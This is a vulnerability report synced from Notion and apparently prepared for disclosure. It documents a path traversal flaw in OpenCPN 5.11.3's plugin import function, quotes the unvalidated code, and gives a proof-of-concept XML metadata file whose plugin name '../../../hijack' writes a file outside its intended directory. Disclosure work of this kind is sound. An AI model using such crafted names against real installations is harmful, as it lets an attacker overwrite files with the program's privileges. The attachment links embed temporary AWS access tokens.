---
notion_url: https://www.notion.so/325be0809830834c8c6381516f4b588c
last_synced: 2026-06-12 09:07
tags: [notion-sync]
---

# File overwrite - Path traversal report

- 📄 [[KOR OpenCPN File overwrite - Path traversal report/KOR OpenCPN File overwrite - Path traversal report|KOR OpenCPN File overwrite - Path traversal report]]

Vulnerability Title : OpenCPN File overwrite - Path traversal report
Vulnerability Summary: File overwrite due to creation of a `.meta` file without path validation
Vendor : Github OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Path Traversal
Impact : File overwrite with process privileges
Vulnerable Source File: `Console.cpp
`
Vulnerable Function: `import_plugin()`
Vulnerable Parameter : 

```c++
metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
```

Affected Environment: Ubuntu 24.04

Proof Of Concept  : 

While analyzing `console.cpp` inside `opencpn/cli`, in `import_plugin()`:

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```


After confirming that there is no validation of the `metadata.name` path, an XML file was created for testing:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```


Inserted `..` and `/` into `<name>` to attempt path traversal:

![image](_assets/image.png)


Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RK47YS3A%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T000704Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEAaCXVzLXdlc3QtMiJIMEYCIQD5%2FDX9GTaQ3DOFTqtvuls3A%2FiVAgr4GIylAzD0lw9xRQIhAIREj33L4JLRhvMDpk6Tp6ahWsjSKMgqxyonq9EGT3IKKv8DCAkQABoMNjM3NDIzMTgzODA1IgxMTi1%2F6bUolbddQ%2BAq3ANO0Jc2Md%2FGeXdrhDiQrhProfHtRIuzoEU8vU3f4aKmztzxGVxOkPJquhYZKwoj%2Bs2QgQmxSwF7PLyNQiYC%2FjowteMgm76PKXvebgifVElIpciGQF%2BWWReH9ATpKShCQna%2Fb475bOmM%2FpsD%2FGfDKkCv%2B6SFVOWD%2FSe5qvU9H8igA34dsD9bJL%2BwTlLqV8lPn1Lrngo%2BJgwnr%2B%2B9uwv2MUsWpZfS8hNXNSVzTnaVWVQ4Irfe4akA05WPimoJl35WJW6KN9zUv%2F06Zg7fDfpDwiTqwfLW8GmwgwasyLqFjsyxk9ksV8hI17g98NhkSUOAT%2FcAsnHTZpuYh7EBG2VLwSENwgL2vQY29W2pA1n8xQIbWO%2Ba%2FGuVvtAKVU4Ll5jpOQ9gZkqCYV4BByn%2Fa7tVSn0nluKB1qyCmKXDwaiuz0HcyoGUfCh6ZBR4cudPkPcF%2FIMMY1DDWpgsgXm7LNSf2qlQJ9dytHO3eQDe0kAcDbh7BDGLma0TjMtln9cLmtdsVsulIkWpqcNf02SCcCvLraXQO7qpH0oa%2F7ykoIe9%2B8mhY3CWQQCvw9DCIob51CTxuo%2B7urXydSdLP21YDD0B8RuuklY%2BYQCvaRPAsdKK%2FHhKWJeaW1nVUVUb8xThETDBj63RBjqkASBUj4zs%2FBa1EyKcbaSrUnfXjAmfOP95MWkrfVvDmHPVsMEmhY1XCpp9UpIQUEqHcTUSwDm4XPetRhhkelprbSjMsjYRYYkqkZXh%2FHy46uJegvVYNgMu50S9n5AIA9QX65Und9aP1fH2E7gNz4NLAvTFZZeENalRGUkZrVlf1W7Ry428ix8MwB9BjSFeNml6WA1jUmJ0qqMF37%2BsUjJT5U331b0%2F&X-Amz-Signature=02d032d63e71e72df31b51ccb0955dbbefbc7952d7a2dbb321df7b7e01d3b223&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report1.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/906fde38-249e-4345-a05b-12f9884900fa/zdi_report1.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RK47YS3A%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T000704Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEAaCXVzLXdlc3QtMiJIMEYCIQD5%2FDX9GTaQ3DOFTqtvuls3A%2FiVAgr4GIylAzD0lw9xRQIhAIREj33L4JLRhvMDpk6Tp6ahWsjSKMgqxyonq9EGT3IKKv8DCAkQABoMNjM3NDIzMTgzODA1IgxMTi1%2F6bUolbddQ%2BAq3ANO0Jc2Md%2FGeXdrhDiQrhProfHtRIuzoEU8vU3f4aKmztzxGVxOkPJquhYZKwoj%2Bs2QgQmxSwF7PLyNQiYC%2FjowteMgm76PKXvebgifVElIpciGQF%2BWWReH9ATpKShCQna%2Fb475bOmM%2FpsD%2FGfDKkCv%2B6SFVOWD%2FSe5qvU9H8igA34dsD9bJL%2BwTlLqV8lPn1Lrngo%2BJgwnr%2B%2B9uwv2MUsWpZfS8hNXNSVzTnaVWVQ4Irfe4akA05WPimoJl35WJW6KN9zUv%2F06Zg7fDfpDwiTqwfLW8GmwgwasyLqFjsyxk9ksV8hI17g98NhkSUOAT%2FcAsnHTZpuYh7EBG2VLwSENwgL2vQY29W2pA1n8xQIbWO%2Ba%2FGuVvtAKVU4Ll5jpOQ9gZkqCYV4BByn%2Fa7tVSn0nluKB1qyCmKXDwaiuz0HcyoGUfCh6ZBR4cudPkPcF%2FIMMY1DDWpgsgXm7LNSf2qlQJ9dytHO3eQDe0kAcDbh7BDGLma0TjMtln9cLmtdsVsulIkWpqcNf02SCcCvLraXQO7qpH0oa%2F7ykoIe9%2B8mhY3CWQQCvw9DCIob51CTxuo%2B7urXydSdLP21YDD0B8RuuklY%2BYQCvaRPAsdKK%2FHhKWJeaW1nVUVUb8xThETDBj63RBjqkASBUj4zs%2FBa1EyKcbaSrUnfXjAmfOP95MWkrfVvDmHPVsMEmhY1XCpp9UpIQUEqHcTUSwDm4XPetRhhkelprbSjMsjYRYYkqkZXh%2FHy46uJegvVYNgMu50S9n5AIA9QX65Und9aP1fH2E7gNz4NLAvTFZZeENalRGUkZrVlf1W7Ry428ix8MwB9BjSFeNml6WA1jUmJ0qqMF37%2BsUjJT5U331b0%2F&X-Amz-Signature=d897985180360b12e0e47a478b09f0eff554cc59b204b5e711bd296a4eb655d1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
